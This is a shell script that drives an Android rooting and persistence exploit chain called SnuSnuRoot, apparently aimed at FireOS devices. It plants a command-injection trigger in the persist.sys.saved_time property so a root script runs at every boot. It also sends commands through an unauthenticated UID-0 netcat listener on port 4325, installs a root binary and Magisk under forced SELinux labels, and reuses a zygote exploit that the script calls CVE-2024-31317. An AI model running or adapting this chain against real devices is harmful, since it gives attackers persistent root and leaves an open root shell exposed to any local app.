#!/bin/sh
#
# runme.sh - SnuSnuRoot top-level driver.
#
# Subcommands:
#   arm         install the direct-boot persistence actor, stage the UID-0
#               waiter/Magisk files, and arm persist.sys.saved_time.
#   root        host-driven fallback: run scripts/root_poc.sh root (classic path)
#   bootstrap   host-driven fallback: run scripts/snusnu_magisk_bootstrap.sh start
#   manager     host-driven fallback: run scripts/snusnu_magisk_manager.sh setup
#   request     trigger an adb-shell MagiskSU authorization request
#   disarm      disable the autonomous chain and restore the original numeric
#               persist.sys.saved_time through the existing UID-0 channel.
#   status      report device health: arm/app state, SELinux,
#               uid-0 listener, Magisk runtime/daemon/Manager, last boot result
#   verify      require the complete post-reboot state or exit nonzero
#   doctor      verify host portability and all shipped runtime artifacts
#
# Usage:
#   ./runme.sh arm
#   ./runme.sh status
#   ./runme.sh verify
#   ./runme.sh disarm
#   ./runme.sh doctor
#   ./runme.sh root|bootstrap|manager       (host-driven fallbacks)
#
# End-user host requirements: Linux and standard shell utilities. A hermetic
# x86_64 adb runtime and all device artifacts are shipped in the repository.
# An Android SDK/JDK is needed only by maintainers rebuilding the boot APK.

set -eu

repo_dir="$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)"
bundled_adb="$repo_dir/tools/xbps-root/usr/bin/adb.xbps"
bundled_loader="$repo_dir/tools/xbps-root/usr/lib/ld-linux-x86-64.so.2"
bundled_lib="$repo_dir/tools/xbps-root/usr/lib"

select_adb() {
    if [ -n "${ADB:-}" ]; then
        [ -x "$ADB" ] || die "ADB is not executable: $ADB"
        adb_mode=external
        adb_bin="$ADB"
    elif [ "${SNUSNU_USE_BUNDLED_ADB:-0}" != 1 ] && command -v adb >/dev/null 2>&1; then
        adb_mode=external
        adb_bin="$(command -v adb)"
    elif [ "$(uname -m)" = x86_64 ] && [ -x "$bundled_adb" ] \
            && [ -x "$bundled_loader" ]; then
        # Invoke the shipped glibc loader explicitly. This works on both glibc
        # and musl distributions and does not depend on host shared libraries.
        adb_mode=bundled
        adb_bin="$bundled_adb"
    else
        die "adb unavailable (install Android platform-tools or set ADB=/path/to/adb)"
    fi
}

adb_with_timeout() {
    adb_limit="$1"
    shift
    if [ "$adb_mode" = bundled ]; then
        timeout "$adb_limit" "$bundled_loader" --library-path "$bundled_lib" \
            "$adb_bin" "$@"
    else
        timeout "$adb_limit" "$adb_bin" "$@"
    fi
}

SNS=/data/securedStorageLocation/snusnu
WATER_DIR=/data/securedStorageLocation/w
WATER_FILE="$WATER_DIR/b"
SNS_LOG_DIR="$SNS/state"
DISABLE_SENTINEL="$SNS/disable"
TRIGGER='x[$(sleep 30;/system/bin/sh /data/securedStorageLocation/w/b)]000'
PERSIST_PACKAGE=io.github.voidnullvalue.snusnuroot.persistence
PERSIST_ENABLED_KEY=snusnu_persist_enabled
PERSIST_STATUS_KEY=snusnu_persist_status
PERSIST_REARM_KEY=snusnu_rearm_status
PERSIST_BOOT_KEY=snusnu_persist_boot_id
PERSIST_RETRY_KEY=snusnu_retry_count
PERSIST_NATIVE_KEY=snusnu_native_result

adb() { adb_with_timeout 30 "$@"; }
die() { echo "FATAL: $*" >&2; exit 1; }

require_host() {
    [ "$(uname -s)" = Linux ] || die "Linux host required"
    for host_tool in timeout awk base64 fold grep sed sha256sum tr; do
        command -v "$host_tool" >/dev/null 2>&1 \
            || die "missing host utility: $host_tool"
    done
    select_adb
}

commit_actor_enable() {
    adb shell "settings put global '$PERSIST_ENABLED_KEY' 1; sync" >/dev/null
    sleep 2
    enabled="$(adb shell "settings get global '$PERSIST_ENABLED_KEY'" | tr -d '\r')"
    [ "$enabled" = 1 ] || die "boot actor enable commit failed: $enabled"
}

require_device() {
    state="$(adb devices 2>&1 | awk '$2 == "device" {print $1}')"
    [ -n "$state" ] || die "no authorized device (adb devices <serial> device)"
    device_count="$(printf '%s\n' "$state" | awk 'END { print NR }')"
    [ "$device_count" -eq 1 ] || die "multiple devices; set ANDROID_SERIAL"
    echo "device=$state"
}

doctor() {
    echo "host=$(uname -s) arch=$(uname -m) shell=/bin/sh"
    echo "adb_mode=$adb_mode adb=$adb_bin"
    adb version | sed -n '1,2p'
    (cd "$repo_dir/prebuilt" && sha256sum -c SHA256SUMS)
    [ -x "$repo_dir/prebuilt/device/arm64-v8a/snusnu_hwbinder_root" ] \
        || die "missing hwbinder carrier"
    for initial_asset in agent.jar libcodex_jni.so libhwbinder_target.so stub.apk; do
        [ -s "$repo_dir/prebuilt/device/arm64-v8a/$initial_asset" ] \
            || die "missing initial-root artifact: $initial_asset"
    done
    [ -s "$repo_dir/prebuilt/device/armeabi-v7a/libhwbinder_target.so" ] \
        || die "missing ELF32 hwbinder JNI artifact"
    if grep -R -E 'svc power reboot|PowerManager.*reboot' \
            "$repo_dir/poc/snusnu-persist-app/src" >/dev/null 2>&1; then
        die "unsafe automatic reboot path found in persistence actor"
    fi
    echo "PORTABLE_OK runtime needs no SDK/JDK/compiler; persistence has no automatic reboot path"
}

wait_boot() {
    b=""
    for i in $(seq 1 60); do
        b="$(adb shell getprop sys.boot_completed 2>&1 | tr -d '\r')"
        [ "$b" = 1 ] && break
        sleep 5
    done
    [ "$b" = 1 ] || die "boot_completed never reached"
    echo "boot_completed=1"
}

## ---- autonomous staging ----------------------------------------------------
# Nothing here can write into /data/securedStorageLocation from adb shell
# (uid 2000): the secured dir is owned by system with assetstorage_data_file
# context. So we host-push binaries into /data/local/tmp (shell-writable) and
# then copy them into place through the existing UID-0 listener.
SNS_STAGE=/data/local/tmp/snusnu-stage

stage_to_local_tmp() {
    adb shell "rm -rf '$SNS_STAGE'; mkdir -p '$SNS_STAGE/magisk'" >/dev/null
    adb push "$repo_dir/scripts/snusnu_waiter.sh" "$SNS_STAGE/waiter.sh" >/dev/null
    adb push "$repo_dir/scripts/snusnu_magisk_device_restore.sh" "$SNS_STAGE/magisk_restore.sh" >/dev/null
    adb push "$repo_dir/prebuilt/device/arm64-v8a/snusnu_hwbinder_root" "$SNS_STAGE/hwbinder_root" >/dev/null

    magisk="$repo_dir/prebuilt/device/arm64-v8a/magisk"
    policy="$repo_dir/prebuilt/device/arm64-v8a/magiskpolicy"
    [ -x "$magisk" ] || die "built magisk binary missing: $magisk"
    [ -x "$policy" ] || die "built magiskpolicy binary missing: $policy"
    adb push "$magisk" "$SNS_STAGE/magisk/magisk" >/dev/null
    adb push "$policy" "$SNS_STAGE/magisk/magiskpolicy" >/dev/null

    adb push "$repo_dir/prebuilt/device/arm64-v8a/stub.apk" \
        "$SNS_STAGE/magisk/stub.apk" >/dev/null
    echo "staged -> $SNS_STAGE (copied into place via UID-0 below)"
}

# Prepare the persistent secured directory through UID 0 and snapshot the
# numeric restore value for disarm. Returns the shell command string to emit.
#   $1 = old_time (numeric)
#   $2 = file:local_pair space-separated triplets "devpath localpath" for partial stages
channel_copy_command() {
    printf '%s' \
      "mkdir -p $SNS; chmod 0755 $SNS; " \
      "rm -f $SNS/disable; mkdir -p $SNS/state; chmod 0777 $SNS/state; " \
      "printf '%s' '$1' > /data/local/tmp/__reroot_old_time 2>/dev/null; " \
      "ls -ldZ $SNS;
"
}

install_system_carrier() {
    carrier=/data/snusnu_hwbinder_root
    carrier_tmp=/data/local/tmp/snusnu_hwbinder_root.new
    carrier_install_tmp=/data/snusnu_hwbinder_root.new
    source="$repo_dir/prebuilt/device/arm64-v8a/snusnu_hwbinder_root"
    expected="$(sha256sum "$source" | awk '{print $1}')"
    identity="$(printf 'id\nexit\n' | adb shell 'toybox nc -w 3 127.0.0.1 4325' 2>/dev/null | tr -d '\r')"
    case "$identity" in *uid=0*) : ;; *) die "UID-0 listener required to install system_data carrier; run SnusnuRoot first" ;; esac
    installed="$({ printf 'toybox sha256sum %s 2>/dev/null\nls -lZ %s 2>/dev/null\nexit\n' "$carrier" "$carrier"; } |
        adb shell 'toybox nc -w 5 127.0.0.1 4325' 2>/dev/null | tr -d '\r')"
    case "$installed" in
        *"$expected"*-rwxr-x---*system_data_file*|*"$expected"*-rwxr-xr-x*system_data_file*) return 0 ;;
    esac
    # Use adb's binary-safe sync protocol into shell-owned temporary storage,
    # then copy and verify under UID 0. Only rename over the live carrier after
    # the complete new file has the expected digest, so an interrupted upgrade
    # leaves the previous executable intact.
    adb push "$source" "$carrier_tmp" >/dev/null
    pushed="$(adb shell "toybox sha256sum '$carrier_tmp' 2>/dev/null" | tr -d '\r')"
    case "$pushed" in *"$expected"*) : ;; *) die "temporary carrier push hash mismatch: $pushed" ;; esac
    output="$(printf 'cp %s %s && chown 0:1000 %s && chmod 0750 %s && chcon u:object_r:system_data_file:s0 %s && test "$(toybox sha256sum %s | cut -d" " -f1)" = %s && mv -f %s %s && sync\ntoybox sha256sum %s\nls -lZ %s\nrm -f %s\nexit\n' \
        "$carrier_tmp" "$carrier_install_tmp" "$carrier_install_tmp" "$carrier_install_tmp" \
        "$carrier_install_tmp" "$carrier_install_tmp" "$expected" "$carrier_install_tmp" "$carrier" \
        "$carrier" "$carrier" "$carrier_tmp" |
        adb_with_timeout 30 shell 'toybox nc -w 20 127.0.0.1 4325' 2>&1 | tr -d '\r')"
    case "$output" in
        *"$expected"*system_data_file*) : ;;
        *) die "UID-0 system carrier install failed: $output" ;;
    esac
}

install_boot_entry() {
    source="$repo_dir/scripts/snusnu_boot_entry.sh"
    pushed_tmp=/data/local/tmp/snusnu_boot_entry.new
    install_tmp="$WATER_FILE.new"
    expected="$(sha256sum "$source" | awk '{print $1}')"
    adb push "$source" "$pushed_tmp" >/dev/null
    pushed="$(adb shell "toybox sha256sum '$pushed_tmp' 2>/dev/null" | tr -d '\r')"
    case "$pushed" in *"$expected"*) : ;; *) die "temporary boot-entry push hash mismatch: $pushed" ;; esac
    output="$(printf 'mkdir -p %s && cp %s %s && chmod 0644 %s && test "$(toybox sha256sum %s | cut -d" " -f1)" = %s && mv -f %s %s && sync\ntoybox sha256sum %s\nrm -f %s\nexit\n' \
        "$WATER_DIR" "$pushed_tmp" "$install_tmp" "$install_tmp" "$install_tmp" "$expected" \
        "$install_tmp" "$WATER_FILE" "$WATER_FILE" "$pushed_tmp" |
        adb_with_timeout 30 shell 'toybox nc -w 20 127.0.0.1 4325' 2>&1 | tr -d '\r')"
    case "$output" in *"$expected"*) : ;; *) die "UID-0 boot-entry install failed: $output" ;; esac
}

# Stage any missing pieces (content-parity check against host md5); never cp.
# Small chain files are always re-emitted (cheap, keeps them current); the large
# magisk/magiskpolicy/stub are only staged when absent (several MB over TCP).
install_staged_via_root() {
    staged="$1"
    target="$2"
    source="$3"
    mode="$4"
    expected="$(sha256sum "$source" | awk '{print $1}')"
    output="$(printf 'cp %s %s.new && chown 1000:1000 %s.new && chmod %s %s.new && test "$(toybox sha256sum %s.new | cut -d" " -f1)" = %s && mv -f %s.new %s\ntoybox sha256sum %s\nexit\n' \
        "$staged" "$target" "$target" "$mode" "$target" "$target" "$expected" \
        "$target" "$target" "$target" |
        adb_with_timeout 30 shell 'toybox nc -w 20 127.0.0.1 4325' 2>&1 | tr -d '\r')"
    case "$output" in *"$expected"*) : ;; *) die "UID-0 staged copy failed for $target: $output" ;; esac
}

stage_missing_via_root() {
    stage_to_local_tmp
    printf 'mkdir -p %s/magisk %s/state; chown 1000:1000 %s %s/magisk %s/state; chmod 0755 %s %s/magisk; chmod 0777 %s/state\nexit\n' \
        "$SNS" "$SNS" "$SNS" "$SNS" "$SNS" "$SNS" "$SNS" "$SNS" |
        adb shell 'toybox nc -w 10 127.0.0.1 4325' >/dev/null
    install_staged_via_root "$SNS_STAGE/waiter.sh" "$SNS/waiter.sh" \
        "$repo_dir/scripts/snusnu_waiter.sh" 0755
    install_staged_via_root "$SNS_STAGE/magisk_restore.sh" "$SNS/magisk_restore.sh" \
        "$repo_dir/scripts/snusnu_magisk_device_restore.sh" 0755
    install_staged_via_root "$SNS_STAGE/hwbinder_root" "$SNS/hwbinder_root" \
        "$repo_dir/prebuilt/device/arm64-v8a/snusnu_hwbinder_root" 0755
    install_staged_via_root "$SNS_STAGE/magisk/magisk" "$SNS/magisk/magisk" \
        "$repo_dir/prebuilt/device/arm64-v8a/magisk" 0755
    install_staged_via_root "$SNS_STAGE/magisk/magiskpolicy" "$SNS/magisk/magiskpolicy" \
        "$repo_dir/prebuilt/device/arm64-v8a/magiskpolicy" 0755
    install_staged_via_root "$SNS_STAGE/magisk/stub.apk" "$SNS/magisk/stub.apk" \
        "$repo_dir/prebuilt/device/arm64-v8a/stub.apk" 0644
    adb shell "rm -rf '$SNS_STAGE'" >/dev/null
}

## ---- arm through the proven UID-0 listener ---------------------------------
arm() {
    require_device
    wait_boot

    # Restore the exact prior enable state after an interrupted upgrade. Never
    # turn a previously disabled actor on merely because installation failed.
    actor_was_enabled="$(adb shell "settings get global '$PERSIST_ENABLED_KEY'" | tr -d '\r')"
    [ "$actor_was_enabled" = 1 ] || actor_was_enabled=0
    package_was_disabled=0
    case "$(adb shell "dumpsys package '$PERSIST_PACKAGE' | grep 'User 0:' | head -1" | tr -d '\r')" in
        *enabled=3*) package_was_disabled=1 ;;
    esac
    arm_committed=0
    trap 'if [ "${arm_committed:-0}" != 1 ]; then adb shell "settings put global '\''$PERSIST_ENABLED_KEY'\'' '\''$actor_was_enabled'\''" >/dev/null 2>&1 || true; if [ "${package_was_disabled:-0}" = 1 ]; then adb shell "pm disable-user --user 0 '\''$PERSIST_PACKAGE'\''" >/dev/null 2>&1 || true; fi; fi' 0

    # Keep package replacement inert until all device-side files and the trigger
    # are committed. MY_PACKAGE_REPLACED is otherwise a valid boot-style entry.
    adb shell "settings put global '$PERSIST_ENABLED_KEY' 0" >/dev/null
    apk="$repo_dir/prebuilt/snusnu-persistence.apk"
    if [ "${SNUSNU_REBUILD_APP:-0}" = 1 ]; then
        "$repo_dir/poc/snusnu-persist-app/build.sh"
        apk="$repo_dir/poc/snusnu-persist-app/build/snusnu-persistence.apk"
    fi
    [ -s "$apk" ] || die "persistence APK missing: $apk"
    if ! install_out="$(adb install -r "$apk" 2>&1)"; then
        # Do not silently disable an older working install if the local signing
        # keystore was lost and a replacement APK has a different identity.
        die "persistence APK install failed (prior enable state will be restored): $install_out"
    fi
    adb shell "pm enable --user 0 '$PERSIST_PACKAGE'" >/dev/null \
        || die "persistence APK enable failed"
    adb shell "pm grant '$PERSIST_PACKAGE' android.permission.WRITE_SECURE_SETTINGS" >/dev/null \
        || die "WRITE_SECURE_SETTINGS development grant failed"
    # FireOS 7.3.3.1 starts and finishes this NoDisplay activity but its
    # `am start -W` waiter never returns.  A normal explicit launch is enough
    # to clear the package stopped/notLaunched bits; verify those bits instead
    # of treating the vendor ActivityManager wait bug as a launch failure.
    adb shell "am start -n '$PERSIST_PACKAGE/.BootstrapActivity'" >/dev/null \
        || die "persistence APK bootstrap launch failed"
    package_user_state="$(adb shell "dumpsys package '$PERSIST_PACKAGE' | grep 'User 0:' | head -1" | tr -d '\r')"
    case "$package_user_state" in
        *stopped=false*notLaunched=false*) : ;;
        *) die "persistence APK remained stopped/not-launched: $package_user_state" ;;
    esac

    install_system_carrier
    install_boot_entry

    exempt="$(adb shell 'settings get global hidden_api_blacklist_exemptions' | tr -d '\r')"
    [ "$exempt" = null ] || die "stale exemptions value: $exempt"

    old_time="$(adb shell getprop persist.sys.saved_time | tr -d '\r')"
    if [ "$old_time" = "$TRIGGER" ]; then
        # Under Enforcing, shell is allowed to stat/list assetstorage files but
        # access(X_OK) is denied. Check committed directory entries here; the
        # time_update domain performs the actual execution on boot.
        ready="$(adb shell "ls -l '$SNS/waiter.sh' '$SNS/hwbinder_root' '$WATER_FILE' >/dev/null 2>&1 && echo ready || echo partial" | tr -d '\r')"
        if [ "$ready" != ready ]; then
            identity="$(printf 'id\nexit\n' | adb shell 'toybox nc -w 3 127.0.0.1 4325' 2>/dev/null | tr -d '\r')"
            case "$identity" in *uid=0*) stage_missing_via_root ;; *) die "trigger is armed but helpers are incomplete and UID-0 repair is unavailable" ;; esac
            ready="$(adb shell "ls -l '$SNS/waiter.sh' '$SNS/hwbinder_root' '$WATER_FILE' >/dev/null 2>&1 && echo ready || echo partial" | tr -d '\r')"
            [ "$ready" = ready ] || die "helper repair did not commit all required files"
        fi
        identity="$(printf 'printf "0\\n" > '$SNS'/state/retry_count; chmod 0666 '$SNS'/state/retry_count; sync; echo retry_reset\nexit\n' |
            adb shell 'toybox nc -w 5 127.0.0.1 4325' 2>/dev/null | tr -d '\r')"
        case "$identity" in *retry_reset*) : ;; *) die "UID-0 retry-state reset failed" ;; esac
        adb shell "settings put global '$PERSIST_RETRY_KEY' 0" >/dev/null
        commit_actor_enable
        arm_committed=1
        trap - 0
        echo "autonomous persistence already armed; APK refreshed and permission verified"
        return 0
    fi
    case "$old_time" in
        ''|*[!0-9]*) die "saved_time is not a clean numeric value: $old_time" ;;
    esac

    # Initial root already provides the time_update UID-0 channel. Use it for
    # persistence files so installation never depends on a second zygote
    # exploit slot in the same boot.
    stage_missing_via_root

    trigger_b64="$(printf '%s' "$TRIGGER" | base64 | tr -d '\n')"

    stage_command="$(channel_copy_command "$old_time")setprop persist.sys.saved_time \"\$(printf '%s' '$trigger_b64' | toybox base64 -d)\"; log -t REROOTWAIT \"armed=\$(getprop persist.sys.saved_time)\";"

    { printf '%s\n' "$stage_command"; printf 'exit\n'; } |
        adb shell 'toybox nc -w 30 127.0.0.1 4325' >/dev/null

    printf 'printf "0\\n" > %s/state/retry_count; chmod 0666 %s/state/retry_count; sync\nexit\n' "$SNS" "$SNS" |
        adb shell 'toybox nc -w 10 127.0.0.1 4325' >/dev/null

    sleep 3
    exempt="$(adb shell 'settings get global hidden_api_blacklist_exemptions' | tr -d '\r')"
    [ "$exempt" = null ] || die "exemptions cleanup failed: $exempt"
    armed="$(adb shell getprop persist.sys.saved_time | tr -d '\r')"
    # If waiter was consumed in this boot (numeric value), skip re-arm verification
    case "$armed" in
        ""|*[!0-9]*) die "waiter property value invalid: $armed" ;;
        "$TRIGGER") : ;; # normal case
        *) echo "info: waiter property consumed in this boot ($armed); proceeding with boot actor" ;;
    esac
    adb shell "settings put global '$PERSIST_STATUS_KEY' installed; settings delete global '$PERSIST_REARM_KEY'; settings put global '$PERSIST_RETRY_KEY' 0" >/dev/null
    commit_actor_enable

    arm_committed=1
    trap - 0

    echo "autonomous chain armed (restore_value=$old_time)"
    echo "next normal reboot will run the direct-boot exploit, re-arm, and restore root/Magisk"
}

## ---- status ----------------------------------------------------------------
device_out() { adb shell "$@" 2>/dev/null | tr -d '\r'; }

status() {
    require_device
    echo "== persistence =="
    saved="$(device_out getprop persist.sys.saved_time)"
    if [ "$saved" = "$TRIGGER" ]; then
        echo "armed=yes (autonomous trigger)"
    else
        case "$saved" in
            ''|*[!0-9]*) echo "armed=unknown (saved_time=$saved)" ;;
            *) echo "armed=no (numeric saved_time=$saved)" ;;
        esac
    fi
    echo "disable_sentinel=$(device_out "test -e '$DISABLE_SENTINEL' && echo present || echo absent")"
    echo "boot_actor=$(device_out "pm path '$PERSIST_PACKAGE' >/dev/null 2>&1 && echo installed || echo missing")"
    echo "boot_actor_enabled=$(device_out "settings get global '$PERSIST_ENABLED_KEY'")"
    echo "boot_actor_result=$(device_out "settings get global '$PERSIST_STATUS_KEY'")"
    echo "boot_actor_boot_id=$(device_out "settings get global '$PERSIST_BOOT_KEY'")"
    echo "rearm_result=$(device_out "settings get global '$PERSIST_REARM_KEY'")"
    echo "retry_count=$(device_out "settings get global '$PERSIST_RETRY_KEY'")"
    echo "native_result=$(device_out "settings get global '$PERSIST_NATIVE_KEY'")"
    echo "resident_carrier=$(device_out "ps -A | grep '[s]nusnu_hwbinder_root' | head -1")"
    echo "write_secure_settings=$(device_out "dumpsys package '$PERSIST_PACKAGE' 2>/dev/null | grep 'android.permission.WRITE_SECURE_SETTINGS: granted=' | tail -1")"
    echo
    echo "== autonomous boot helper =="
    if device_out "ls -l '$SNS/waiter.sh' '$SNS/hwbinder_root' '$WATER_FILE' >/dev/null 2>&1 && echo ok || echo missing" | grep -q ok; then
        echo "boot_helper=installed"
    else
        echo "boot_helper=not_installed"
    fi
    echo "last_log_line=$(device_out "tail -1 '$SNS_LOG_DIR/latest.log' 2>/dev/null" | tail -1)"
    echo "boot_result=$(device_out "cat '$SNS_LOG_DIR/last_result' 2>/dev/null")"
    echo "consecutive_failures=$(device_out "cat '$SNS_LOG_DIR/consecutive_failures' 2>/dev/null")"
    echo
    echo "== SELinux =="
    echo "getenforce=$(device_out getenforce)"
    echo
    echo "== uid-0 root listener (127.0.0.1:4325) =="
    rp="$(printf 'id -u\nexit\n' | device_out "toybox nc -w 2 127.0.0.1 4325" | tail -1)"
    case "$rp" in
        0*) echo "listener=up (uid-0 reply: $rp)" ;;
        *) echo "listener=down" ;;
    esac
    echo
    echo "== Magisk runtime =="
    magisk_status="$(device_out "sh '$SNS/magisk_restore.sh' status" | grep -v '^$' || true)"
    if [ -z "$magisk_status" ]; then
        echo "runtime=$(device_out "test -x /sbin/magisk && echo present || echo absent")"
        echo "daemon_socket=$(device_out "test -e /sbin/.magisk/device/socket 2>/dev/null && echo present || echo absent")"
    else
        printf '%s\n' "$magisk_status"
    fi
    echo
    echo "== magiskd daemon =="
    echo "magiskd=$(device_out "ps | grep '[m]agiskd' | head -1")"
    echo
    echo "== Manager =="
    if device_out "pm path com.topjohnwu.magisk 2>/dev/null" | grep -q '^package:'; then
        echo "manager_installed=yes"
    else
        echo "manager_installed=no"
    fi
    echo
    echo "== recent persistence log =="
    adb logcat -d -t 40 -s SnuSnuPersist:I SNUSNU_WAITER:I REROOTWAIT:I '*:S' 2>/dev/null | tr -d '\r' || true
}

## ---- disarm ----------------------------------------------------------------
disarm() {
    require_device
    old="$(adb shell 'cat /data/local/tmp/__reroot_old_time' 2>&1 | tr -d '\r')"
    case "$old" in ''|*[!0-9]*) die "restore snapshot missing: $old";; esac

    # Stop the boot actor before obtaining a fresh one-shot. It normally spends
    # CVE-2024-31317 early each boot, so a reboot is required before the cleanup
    # UID-1000 channel can be created reliably.
    adb shell "settings put global '$PERSIST_ENABLED_KEY' 0" >/dev/null
    adb shell "pm revoke '$PERSIST_PACKAGE' android.permission.WRITE_SECURE_SETTINGS" >/dev/null 2>&1 || true
    adb uninstall "$PERSIST_PACKAGE" >/dev/null 2>&1 || true
    adb reboot
    wait_boot

    adb shell < "$repo_dir/scripts/zygote_payload_system_app.sh" >/dev/null
    sleep 3
    identity="$(printf 'id\n' | adb shell 'toybox nc -w 3 127.0.0.1 4321' 2>/dev/null | tr -d '\r')"
    case "$identity" in *uid=1000*context=u:r:system_app:s0*) : ;; *) die "cleanup uid-1000 channel failed after reboot: $identity" ;; esac
    cmd="setprop persist.sys.saved_time $old; rm -f $WATER_FILE /data/snusnu_hwbinder_root; rm -rf $SNS; settings delete global $PERSIST_STATUS_KEY; settings delete global $PERSIST_REARM_KEY; settings delete global $PERSIST_BOOT_KEY; settings delete global $PERSIST_RETRY_KEY; settings delete global $PERSIST_NATIVE_KEY; settings delete global $PERSIST_ENABLED_KEY; log -t REROOTWAIT \"disarmed=\$(getprop persist.sys.saved_time)\";"
    { printf '%s\nexit\n' "$cmd"; } | adb shell 'toybox nc -w 20 127.0.0.1 4321' >/dev/null
    sleep 2
    verify="$(adb shell getprop persist.sys.saved_time 2>&1 | tr -d '\r')"
    [ "$verify" = "$old" ] || { die "disarm FAILED (saved_time=$verify != $old); re-run from a clean boot"; }
    echo "autonomous chain uninstalled (APK/data helpers removed, saved_time=$old)"
}

verify() {
    require_device
    # Follow the current boot through transient ADB disconnects. Native failure
    # deliberately stays booted; persistence never requests an automatic reboot.
    for i in $(seq 1 300); do
        boot_id="$(device_out 'cat /proc/sys/kernel/random/boot_id')"
        actor_boot_id="$(device_out "settings get global '$PERSIST_BOOT_KEY'")"
        saved="$(device_out getprop persist.sys.saved_time)"
        rearm="$(device_out "settings get global '$PERSIST_REARM_KEY'")"
        root_ready="$(printf 'id -u\nexit\n' | device_out "toybox nc -w 2 127.0.0.1 4325" | tail -1)"
        magisk_ready="$(device_out "test -S /sbin/.magisk/device/socket && ps | grep -q '[m]agiskd' && echo yes || echo no")"
        carrier_ready="$(device_out "ps -A | grep -q '[s]nusnu_hwbinder_root' && echo yes || echo no")"
        [ "$actor_boot_id" = "$boot_id" ] && [ "$saved" = "$TRIGGER" ] \
            && [ "$rearm" = ok ] && [ "$root_ready" = 0 ] \
            && [ "$magisk_ready" = yes ] && [ "$carrier_ready" = yes ] && break
        case "$rearm" in failed_no_reboot_*) break ;; esac
        sleep 1
    done
    status
    saved="$(device_out getprop persist.sys.saved_time)"
    actor="$(device_out "settings get global '$PERSIST_STATUS_KEY'")"
    actor_boot_id="$(device_out "settings get global '$PERSIST_BOOT_KEY'")"
    boot_id="$(device_out 'cat /proc/sys/kernel/random/boot_id')"
    rearm="$(device_out "settings get global '$PERSIST_REARM_KEY'")"
    enforce="$(device_out getenforce)"
    root_uid="$(printf 'id -u\nexit\n' | device_out "toybox nc -w 2 127.0.0.1 4325" | tail -1)"
    magisk_ready="$(device_out "test -S /sbin/.magisk/device/socket && ps | grep -q '[m]agiskd' && echo yes || echo no")"
    carrier_ready="$(device_out "ps -A | grep -q '[s]nusnu_hwbinder_root' && echo yes || echo no")"
    [ "$saved" = "$TRIGGER" ] || die "verification: trigger not re-armed"
    [ "$actor_boot_id" = "$boot_id" ] || die "verification: boot actor did not run this boot"
    [ "$rearm" = ok ] || die "verification: UID-1000 re-arm result=$rearm"
    [ "$actor" = kernel_write_ok ] || die "verification: boot actor result=$actor"
    [ "$enforce" = Permissive ] || die "verification: SELinux=$enforce"
    case "$root_uid" in 0*) : ;; *) die "verification: uid-0 listener unavailable" ;; esac
    [ "$magisk_ready" = yes ] || die "verification: Magisk daemon unavailable"
    [ "$carrier_ready" = yes ] || die "verification: resident hwbinder carrier unavailable"
    echo "VERIFY_OK persistence survived reboot and restored uid-0/Magisk"
}

## ---- dispatch --------------------------------------------------------------
require_host
case "${1:-status}" in
    arm|install)
        arm
        ;;
    status)
        status
        ;;
    verify)
        verify
        ;;
    disarm)
        disarm
        ;;
    root)
        shift 2>/dev/null || true
        "$repo_dir/scripts/root_poc.sh" root "${@:-}"
        ;;
    bootstrap)
        "$repo_dir/scripts/snusnu_magisk_bootstrap.sh" start
        ;;
    manager)
        "$repo_dir/scripts/snusnu_magisk_manager.sh" setup
        ;;
    request)
        "$repo_dir/scripts/snusnu_magisk_manager.sh" request
        ;;
    doctor)
        doctor
        ;;
    *)
        die "usage: $0 {arm|status|verify|disarm|root|bootstrap|manager|request|doctor}"
        ;;
esac
